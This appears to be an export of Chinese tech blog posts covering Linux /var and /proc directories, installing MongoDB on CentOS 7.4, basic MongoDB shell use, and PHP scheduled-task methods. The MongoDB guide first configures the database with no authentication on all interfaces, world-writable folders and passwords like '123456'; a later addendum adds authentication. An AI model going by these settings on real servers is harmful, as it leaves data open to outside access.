中产生一个锁定文件的约定，以用来支持他们正在<br>\n\t使用某个特定的设备或文件。其他程序注意到这个锁定文件时，就不会再使用这个设备或文<br>\n\t件。</li>\n\t<li>/var/log<br>\n\t各种程序的日志( l o g )文件，尤其是login (/var/log/wtmp log纪录所有到系统的登录和注<br>\n\t销) 和syslog (/var/log/messages 纪录存储所有核心和系统程序信息)。/var/log 里的文件经常不<br>\n\t确定地增长，应该定期清除。</li>\n\t<li>/var/run<br>\n\t保存在下一次系统引导前有效的关于系统的信息文件。例如， /var/run/utmp 包含当前登<br>\n\t录的用户的信息。</li>\n\t<li>/var/spool<br>\n\t放置“假脱机( s p o o l )”程序的目录，如m a i l、n e w s、打印队列和其他队列工作的目录。每<br>\n\t个不同的s p o o l在/var/spool 下有自己的子目录，例如，用户的邮箱就存放在/var/spool/mail 中。</li>\n\t<li>/var/tmp<br>\n\t比/tmp 允许更大的或需要存在较长时间的临时文件。<br>\n\t注意系统管理员可能不允许/var/tmp 有很旧的文件。</li>\n</ol><p><strong>/proc文件系统<br>\n/proc 文件系统是一个伪的文件系统，就是说它是一个实际上不存在的目录，因而这是一<br>\n个非常特殊的目录。它并不存在于某个磁盘上，而是由核心在内存中产生。这个目录用于提<br>\n供关于系统的信息。下面说明一些最重要的文件和目录(/proc 文件系统在proc man页中有更详<br>\n细的说明)。</strong></p>\n\n<ol><li>/proc/x<br>\n\t关于进程x的信息目录，这一x是这一进程的标识号。每个进程在/proc 下有一个名为自<br>\n\t己进程号的目录。</li>\n\t<li>/proc/cpuinfo<br>\n\t存放处理器( c p u )的信息，如c p u的类型、制造商、型号和性能等。</li>\n\t<li>/proc/devices<br>\n\t当前运行的核心配置的设备驱动的列表。</li>\n\t<li>/proc/dma<br>\n\t显示当前使用的d m a通道。</li>\n\t<li>/proc/filesystems<br>\n\t核心配置的文件系统信息。</li>\n\t<li>/proc/interrupts<br>\n\t显示被占用的中断信息和占用者的信息，以及被占用的数量。</li>\n\t<li>/proc/ioports<br>\n\t当前使用的i / o端口。</li>\n\t<li>/proc/kcore<br>\n\t系统物理内存映像。与物理内存大小完全一样，然而实际上没有占用这么多内存；它仅<br>\n\t仅是在程序访问它时才被创建。(注意：除非你把它拷贝到什么地方，否则/proc 下没有任何<br>\n\t东西占用任何磁盘空间。)</li>\n\t<li>/proc/kmsg<br>\n\t核心输出的消息。也会被送到s y s l o g。</li>\n\t<li>/proc/ksyms<br>\n\t核心符号表。</li>\n\t<li>/proc/loadavg<br>\n\t系统“平均负载”； 3个没有意义的指示器指出系统当前的工作量。</li>\n\t<li>/proc/meminfo<br>\n\t各种存储器使用信息，包括物理内存和交换分区( s w a p )。</li>\n\t<li>/proc/modules<br>\n\t存放当前加载了哪些核心模块信息。</li>\n\t<li>/proc/net<br>\n\t网络协议状态信息。</li>\n\t<li>/proc/self<br>\n\t存放到查看/proc 的程序的进程目录的符号连接。当2个进程查看/proc 时，这将会是不同<br>\n\t的连接。这主要便于程序得到它自己的进程目录。</li>\n\t<li>/proc/stat<br>\n\t系统的不同状态，例如，系统启动后页面发生错误的次数。</li>\n\t<li>/proc/uptime<br>\n\t系统启动的时间长度。</li>\n\t<li>/proc/version<br>\n\t核心版本。</li>\n</ol>                                    </div>", "log_PostTime": 1584891128, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7.4 安装mongodb", "log_Intro": "CentOS7.4 安装mongodb", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>温馨提示：我的环境是腾讯云自带的CentOS7.4 x64 镜像，本地环境是win10 x64 专业版，ssh工具是用的win10 自带的cmd, 远程工具版本是Robo 3T 1.2.1 。<br>\n如果环境不一致，可能会出现无法预知的错误。</p>\n\n<p>1、去官网找到安装包地址，复制下来。<br>\n官网地址：<a href=\"https://links.jianshu.com/go?to=https%3A%2F%2Fwww.mongodb.com%2Fdownload-center%3Fjmp%3Dnav%23community\" rel=\"nofollow\">https://www.mongodb.com/download-center?jmp=nav#community</a><br>\n我使用的安装包地址：<a href=\"https://links.jianshu.com/go?to=https%3A%2F%2Ffastdl.mongodb.org%2Flinux%2Fmongodb-linux-x86_64-4.0.0.tgz\" rel=\"nofollow\">https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.0.tgz</a></p>\n\n<p>2、使用SSH登录服务器，找一个文件夹存放安装包，我这里使用的是 /usr</p>\n\n<pre class=\"has\">\n<code>$ cd /usr\n$ wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.0.tgz\n</code></pre>\n\n<p>第一步是定位到/usr文件夹，第二步是下载安装包。</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTQzNjc0NjFlMzk5MGU1ZGYucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy85MzYvZm9ybWF0L3dlYnA\"></p>\n\n<p> </p>\n\n<p>如图所示进度到100%时，就是下载完成了。</p>\n\n<p>3、解压缩安装包，并重命名文件夹。</p>\n\n<pre class=\"has\">\n<code>$ tar zxvf mongodb-linux-x86_64-4.0.0.tgz\n$ mv mongodb-linux-x86_64-4.0.0 mongodb\n</code></pre>\n\n<p>第一步是解压缩，第二步是重命名，如图所示。</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTljYWI4MGNlNDY0YWQ1ZDMucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy82MjkvZm9ybWF0L3dlYnA\"></p>\n\n<p>解压缩</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTVhNDU4YmJmY2E3NTk2MGEucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy81MzUvZm9ybWF0L3dlYnA\"></p>\n\n<p>重命名</p>\n\n<p>4、配置环境变量</p>\n\n<pre class=\"has\">\n<code>$ vim /etc/profile\n</code></pre>\n\n<p>在 export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL 一行的上面添加如下内容:</p>\n\n<pre class=\"has\">\n<code>#Set Mongodb\nexport PATH=/usr/mongodb/bin:$PATH\n</code></pre>\n\n<p>保存后通过下面的命令使环境变量生效：</p>\n\n<pre class=\"has\">\n<code>$ cd ~\n$ source /etc/profile\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LWU2MjU0YTE5Yzk1NmZlN2MucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy82MjcvZm9ybWF0L3dlYnA\"></p>\n\n<p>设置环境变量</p>\n\n<p>5、创建数据库目录</p>\n\n<pre class=\"has\">\n<code>$ cd /usr/mongodb\n$ touch mongodb.conf\n$ mkdir db\n$ mkdir log\n$ cd log\n$ touch mongodb.log\n</code></pre>\n\n<p>6、修改mongodb配置文件。</p>\n\n<pre class=\"has\">\n<code>vim /usr/mongodb/mongodb.conf\n</code></pre>\n\n<p>添加以下内容</p>\n\n<pre class=\"has\">\n<code>port=27017 #端口\ndbpath= /usr/mongodb/db #数据库存文件存放目录\nlogpath= /usr/mongodb/log/mongodb.log #日志文件存放路径\nlogappend=true #使用追加的方式写日志\nfork=true #以守护进程的方式运行，创建服务器进程\nmaxConns=100 #最大同时连接数\nnoauth=true #不启用验证\njournal=true #每次写入会记录一条操作日志（通过journal可以重新构造出写入的数据）。\n#即使宕机，启动时wiredtiger会先将数据恢复到最近一次的checkpoint点，然后重放后续的journal日志来恢复。\nstorageEngine=wiredTiger  #存储引擎有mmapv1、wiretiger、mongorocks\nbind_ip = 0.0.0.0  #这样就可外部访问了，例如从win10中去连虚拟机中的MongoDB\n</code></pre>\n\n<p>7、设置文件夹权限</p>\n\n<pre class=\"has\">\n<code>$ cd /usr/mongodb\n$ chmod 777 db\n$ chmod 777 log\n</code></pre>\n\n<p>8、启动mongodb</p>\n\n<pre class=\"has\">\n<code>$ cd ~\n$ mongod --config /usr/mongodb/mongodb.conf\n网友指正：最新版本mongodb已经将--config 修改为 -f (本人尚未尝试)\n</code></pre>\n\n<p>9、远程连接mongodb<br>\n官网下载robo 3t <a href=\"https://links.jianshu.com/go?to=https%3A%2F%2Frobomongo.org%2Fdownload\" rel=\"nofollow\">https://robomongo.org/download</a><br>\n安装完后配置。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTMyZGExODQyZGVlY2I2MWQucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy82NTcvZm9ybWF0L3dlYnA\"></p>\n\n<p>点击creat</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTY0Zjc2YTlhY2I4ZjVlMTQucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy81NDMvZm9ybWF0L3dlYnA\"></p>\n\n<p>请原封不动填写</p>\n\n<p><a href=\"https://www.cnblogs.com/cwp-bg/p/9479945.html\" rel=\"nofollow\" id=\"cb_post_title_url\">MongoDB之conf配置文件详解</a></p>\n\n<p>切换到ssh选项卡</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTJkYjdlNGU5NjRmZDUyNzUucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy81NDgvZm9ybWF0L3dlYnA\"></p>\n\n<p>按图设置</p>\n\n<p> </p>\n\n<p>点save保存</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LWExZDk0OTQ2ZWUwOWNiMjkucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy82NTQvZm9ybWF0L3dlYnA\"></p>\n\n<p>点连接</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LWVkYjRiY2QyNzIxOWJmY2EucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy8zMzAvZm9ybWF0L3dlYnA\"></p>\n\n<p>输入服务器的登录密码</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTEyMWY4MDRkY2U4ZjFiNDgucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy8yNTgvZm9ybWF0L3dlYnA\"></p>\n\n<p>连接成功</p>\n\n<p>10、如何关闭数据库<br>\n查看pid</p>\n\n<pre class=\"has\">\n<code>$ ps aux |grep mongodb\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTM1ZTEwNWMwZTMxZWNhMjkucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy84NjQvZm9ybWF0L3dlYnA\"></p>\n\n<p>pid</p>\n\n<pre class=\"has\">\n<code>$ sudo kill 5314\n</code></pre>\n\n<p>即可关闭数据库</p>\n\n<h3>2018年7月30日补充：</h3>\n\n<p>授权登录<br>\n在日常工作中我们不可能把数据库设置为免认证登录并暴露在公网下，所以我们需要为数据库添加用户名和密码，具体操作如下：（文章来自ChasenKaos，转发请注明。谢谢 原文：<a href=\"https://www.jianshu.com/p/994bc7b19b26\" rel=\"nofollow\">https://www.jianshu.com/p/994bc7b19b26</a>）</p>\n\n<p>1、修改前文提到的conf文件，命令如下：</p>\n\n<pre class=\"has\">\n<code>$ cd /usr/mongodb\n$ vim mongodb.conf\n</code></pre>\n\n<p>打开后如图：</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTMxMjc3MTJiMWU5NjVkZGUucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy84MDMvZm9ybWF0L3dlYnA\"></p>\n\n<p>image.png</p>\n\n<p>我们把noauth那一行，前面加上#，注释掉。<br>\n再在最后一行添加 auth = true<br>\n完整代码如下：</p>\n\n<pre class=\"has\">\n<code>port=27017 #端口\ndbpath= /usr/mongodb/db #数据库存文件存放目录\nlogpath= /usr/mongodb/log/mongodb.log #日志文件存放路径\nlogappend=true #使用追加的方式写日志\nfork=true #以守护进程的方式运行，创建服务器进程\nmaxConns=100 #最大同时连接数\n#noauth = true #不启用验证\njournal=true #每次写入会记录一条操作日志（通过journal可以重新构造出写入的数据）。\n#即使宕机，启动时wiredtiger会先将数据恢复到最近一次的checkpoint点，然后重放后续的journal日志来恢复。\nstorageEngine=wiredTiger  #存储引擎有mmapv1、wiretiger、mongorocks\nbind_ip = 0.0.0.0  #这样就可外部访问了，例如从win10中去连虚拟机中的MongoDB\nauth = true #用户认证\n</code></pre>\n\n<p>保存退出。</p>\n\n<p>2、关闭数据库，前文已经提到了方法，我这里只做操作，如图：</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LWFmMmRkNDAyN2Q0ZTEwNDEucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy84NzMvZm9ybWF0L3dlYnA\"></p>\n\n<p>image.png</p>\n\n<p>3、启动数据库,请参照前文方法，如图：</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LWNhMDAyYmM2YTk5NDY2MGQucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy82NDIvZm9ybWF0L3dlYnA\"></p>\n\n<p>image.png</p>\n\n<p>插曲：在添加用户名之前应该先执行./mongo命令先打开mongodb数据库<br>\n来自网友@OldX_cea8</p>\n\n<p>4、依次执行下列命令 添加用户名</p>\n\n<pre class=\"has\">\n<code>//使用admin数据库\nuse admin\n\n//给admin数据库添加管理员用户名和密码，用户名和密码请自行设置\ndb.createUser({user:\"admin\",pwd:\"123456\",roles:[\"root\"]})\n\n//验证是否成功，返回1则代表成功\ndb.auth(\"admin\", \"123456\")\n\n//切换到要设置的数据库,以test为例\nuse test\n\n//为test创建用户,用户名和密码请自行设置。\ndb.createUser({user: \"test\", pwd: \"123456\", roles: [{ role: \"dbOwner\", db: \"test\" }]})\n</code></pre>\n\n<p>执行完后，ctrl + c结束shell，并通过关闭，打开进行重启数据库。</p>\n\n<p>5、通过robo 3t连接。<br>\nconnection标签页</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTNkYWI2NjIzY2M1MDk2NzgucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy81MzcvZm9ybWF0L3dlYnA\"></p>\n\n<p>connection标签页</p>\n\n<p>authentication标签页</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTYyNTE4YmY2ZDAzOTNmNzIucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy81NDQvZm9ybWF0L3dlYnA\"></p>\n\n<p>authentication标签页</p>\n\n<p>ssh标签页</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTAzMzA1LTdhMTU5YjZmNGYxYTc4N2IucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXAlN0NpbWFnZVZpZXcyLzIvdy81MzkvZm9ybWF0L3dlYnA\"></p>\n\n<p>ssh标签页</p>\n\n<p>点击save后，连接即可，如果出现报错，请核对自己输入的信息是否有误。</p>\n                                    </div>", "log_PostTime": 1584891129, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Mongodb基本操作", "log_Intro": "Mongodb基本操作", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>1.启动（需要密码验证）：</p>\n\n<p># /usr/local/mongodb/bin/mongod --dbpath=/usr/local/mongodb/data/ --fork --logpath=/usr/local/mongodb/log/mongodb.log --auth</p>\n\n<p>2.停止​</p>\n\n<p>pkill mongod​​</p>\n\n<p>3.进入​命令行</p>\n\n<p>/usr/local/mongodb/bin/mong​o</p>\n\n<p>4.基本操作</p>\n\n<p>&gt; <strong>show dbs</strong></p>\n\n<p>local  0.000GB</p>\n\n<p>&gt; <strong>use bzm --这样就创建了一个数据库,如果什么都不操作离开的话,这个库会被系统删除.</strong></p>\n\n<p>switched to db bzm</p>\n\n<p>&gt; <strong>db.usr.insert({'name':'bzmspace'})  --插入数据</strong></p>\n\n<p>WriteResult({ \"nInserted\" : 1 })</p>\n\n<p>&gt; <strong>db.usr.insert({'id':'1','name':'bzmspace'})  --插入数据</strong></p>\n\n<p>WriteResult({ \"nInserted\" : 1 })</p>\n\n<p>&gt; show dbs</p>\n\n<p><strong>bzm    0.000GB</strong></p>\n\n<p>local  0.000GB</p>\n\n<p>&gt; use bzm</p>\n\n<p>switched to db bzm</p>\n\n<p>&gt; <strong>show tables;</strong></p>\n\n<p>usr</p>\n\n<p>&gt; use bzm</p>\n\n<p>switched to db bzm</p>\n\n<p>&gt; <strong>db.addUser('bzm','123')  --新版本已经不支持这样创建用户</strong></p>\n\n<p>2016-06-02T18:21:29.875+0800 E QUERY    [thread1] TypeError: db.addUser is not a function :</p>\n\n<p>@(shell):1:1</p>\n\n<p>&gt; <strong>db.createUser({user:'bzm',pwd:'123',roles:['userAdminAnyDatabase']}) </strong></p>\n\n<p><strong>--创建用户</strong></p>\n\n<p>2016-06-02T18:28:42.843+0800 E QUERY    [thread1] Error: couldn't add user: No role named userAdminAnyDatabase@bzm :</p>\n\n<p>_getErrorWithCode@src/mongo/shell/utils.js:25:13</p>\n\n<p>DB.prototype.createUser@src/mongo/shell/db.js:1267:15</p>\n\n<p>@(shell):1:1</p>\n\n<p> </p>\n\n<p>安全验证登陆：</p>\n\n<p>​[root@bzm bin]# ./mongo</p>\n\n<p>MongoDB shell version: 3.2.6</p>\n\n<p>connecting to: test</p>\n\n<p>&gt; use admin</p>\n\n<p>switched to db admin<strong>--在特权用户root下，admin数据库下的用户是超级用户。</strong></p>\n\n<p>&gt; db.auth('bzm','123')</p>\n\n<p>1  <strong>--1表示登录成功，0表示登录失败。</strong></p>\n\n<p>&gt; </p>\n\n<p>&gt; </p>\n\n<p>&gt; </p>\n\n<p>&gt; show dbs</p>\n\n<p>admin  0.000GB</p>\n\n<p>bzm    0.000GB</p>\n\n<p>local  0.000GB</p>\n\n<p> </p>\n\n<p>删除数据库</p>\n\n<p>&gt; use admin</p>\n\n<p>switched to db admin</p>\n\n<p>&gt; db.dropDatabase();</p>\n\n<p>​{ \"dropped\" : \"admin\", \"ok\" : 1 }</p>\n\n<p>用户操作​</p>\n\n<p>​&gt; db.system.users.find(); --查看用户</p>\n\n<p>&gt; db.system.users.remove({user:\"bzm\"}); --删除用户</p>\n                                    </div>", "log_PostTime": 1584891130, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "详解PHP实现定时任务的五种方法", "log_Intro": "详解PHP实现定时任务的五种方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>定时运行任务对于一个网站来说，是一个比较重要的任务，比如定时发布文档，定时清理垃圾信息等，现在的网站大多数都是采用PHP动态语言开发的，而对于PHP的实现决定了它没有Java和.Net这种AppServer的概念，而http协议是一个无状态的协议，PHP只能被用户触发，被调用，调用后会自动退出内存，没有常驻内存。</p>\n\n<p>如果非要PHP去实现定时任务， 可以有以下几种解决方案：</p>\n\n<h3><strong>一. 简单直接不顾后果型</strong></h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\nignore_user_abort();//关掉浏览器，PHP脚本也可以继续执行.\nset_time_limit(0);// 通过set_time_limit(0)可以让程序无限制的执行下去\nini_set('memory_limit','512M'); // 设置内存限制\n$interval=60*30;// 每隔半小时运行\ndo{\n  //ToDo \n  sleep($interval);// 等待5分钟\n}\nwhile(true);</code></pre>\n\n<p><strong>缺点: </strong>启动之后，便无法控制, 除非终止 PHP 宿主. 不要采用这样方法, 除非你是黑客.</p>\n\n<h3><strong>二. 简单可控型</strong></h3>\n\n<pre class=\"has\">\n<code>config.php\n \n&lt;?php\nreturn 1;\n?&gt;\ncron.php\n \n \n   \nignore_user_abort();//关掉浏览器，PHP脚本也可以继续执行.\nset_time_limit(0);// 通过set_time_limit(0)可以让程序无限制的执行下去\n$interval=60*30;// 每隔半小时运行\ndo{\n  $run = include 'config.php';\n  if(!$run) die('process abort');\n   \n  //ToDo\n  sleep($interval);// 等待5分钟\n}\nwhile(true);</code></pre>\n\n<p>通过 改变config.php 的 <code>return 0 </code>, 来实现停止程序. 一个可行的办法是config.php文件和某个特殊表单交互, 通过HTML页面设置一些变量来进行配置</p>\n\n<p><strong>缺点: </strong>占系统资源, 长时间运行，会有一些意想不到的隐患。比如内存管理方面的问题 .</p>\n\n<h3><strong>三. 简单改进型</strong></h3>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php\n$time=15;\n$url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n/*\n  function\n*/\nsleep($time);\nfile_get_contents($url);\n?&gt;</code></pre>\n\n<p>php脚本sleep 一段时间之后通过访问自身的方式继续执行. 就好像接力赛跑一样..这样就能保证每个PHP脚本执行时间不会太长. 也就不受<code>time_out</code>的限制了.</p>\n\n<p>因为每一次一次循环php文件都是独立执行,所以这种方法,避免了<code>time_out</code>的限制. 但是最好和上边一样 加上控制代码. cofig.php , 以便能够终止进程.</p>\n\n<h3><strong>四. 服务器定时任务</strong></h3>\n\n<p><strong>Unix平台</strong></p>\n\n<p>如果您使用 Unix 系统，您需要在您的 PHP 脚本的最前面加上一行特殊的代码，使得它能够被执行，这样系统就能知道用什么样的程序要运行该脚本。为 Unix 系统增加的第一行代码不会影响该脚本在 Windows 下的运行，因此您也可以用该方法编写跨平台的脚本程序。</p>\n\n<p><strong>1、在Crontab中使用PHP执行脚本</strong></p>\n\n<p>就像在Crontab中调用普通的shell脚本一样（具体Crontab用法），使用PHP程序来调用PHP脚本，每一小时执行 myscript.php 如下：</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">\n# crontab -e\n00 * * * * /usr/local/bin/php /home/john/myscript.php</code></pre>\n\n<p><code>/usr/local/bin/php</code>为PHP程序的路径。</p>\n\n<p><strong>2、在Crontab中使用URL执行脚本</strong></p>\n\n<p>如果你的PHP脚本可以通过URL触发，你可以使用 lynx 或 curl 或 wget 来配置你的Crontab。</p>\n\n<p>下面的例子是使用Lynx文本浏览器访问URL来每小时执行PHP脚本。Lynx文本浏览器默认使用对话方式打开URL。但是，像下面的，我们在lynx命令行中使用-dump选项来把URL的输出转换来标准输出。</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">\t\n00 * * * * lynx -dump http://www.sf.net/myscript.php</code></pre>\n\n<p>下面的例子是使用 CURL 访问URL来每5分执行PHP脚本。Curl默认在标准输出显示输出。使用 \"curl -o\" 选项，你也可以把脚本的输出转储到临时文件temp.txt。</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">*/5 * * * * /usr/bin/curl -o temp.txt http://www.sf.net/myscript.php</code></pre>\n\n<p>下面的例子是使用WGET访问URL来每10分执行PHP脚本。-q 选项表示安静模式。\"-O temp.txt\" 表示输出会发送到临时文件。</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">*/10 * * * * /usr/bin/wget -q -O temp.txt http://www.sf.net/myscript.php</code></pre>\n\n<h3><strong>五. ini_set函数用法详解</strong></h3>\n\n<p><code>PHP ini_set</code>用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。</p>\n\n<p>函数格式：</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">string ini_set(string $varname, string $newvalue)</code></pre>\n\n<p>不是所有的参数都可以配置，可以查看手册中的列表。</p>\n\n<p>常见的设置：</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">@ ini_set('memory_limit', '64M');</code></pre>\n\n<p><strong>menory_limit：</strong>设定一个脚本所能够申请到的最大内存字节数，这有利于写的不好的脚本消耗服务器上的可用内存。@符号代表不输出错误。</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">@ini_set('display_errors', 1);</code></pre>\n\n<p><strong>display_errors：</strong>设置错误信息的类别。</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">@ini_set('session.auto_start', 0);</code></pre>\n\n<p><strong>session.auto_start：</strong>是否自动开session处理，设置为1时，程序中不用session_start()来手动开启session也可使用session，如果参数为0，又没手动开启session，则会报错。</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">@ini_set('session.cache_expire', 180);</code></pre>\n\n<p><strong>session.cache_expire：</strong>指定会话页面在客户端cache中的有限期（分钟）缺省下为180分钟。如果设置了session.cache_limiter=nocache时，此处设置无 效。</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">@ini_set('session.use_cookies', 1);</code></pre>\n\n<p><strong>session.use_cookies：</strong>是否使用cookie在客户端保存会话ID；</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">@ini_set('session.use_trans_sid', 0);</code></pre>\n\n<p>默认是禁止的，因为它会给你用户带来安全危险：</p>\n\n<p>    用户可能将包含有效的sid的URL通过email/irc/QQ/MSN等途径告诉其他人。</p>\n\n<p>    包含有效sid的URL可能会保存在公用电脑上。</p>\n\n<p>    用户可能保存带有固定不变的SID的URL在他们的收藏夹或者浏览历史记录里。 基于URL的会话管理总是比基于Cookie的会话管理有更多的风险，所以应当禁用。</p>\n\n<p>PHP定时任务是一个非常有意思的东西，以上就是本文提供的一些解决方案，你也可以通过本文的思路，开发出自己的一种解决方案。希望能帮助到有需要的大家。</p>\n                                    </div>", "log_PostTime": 1584891131, "log_Meta": ""}
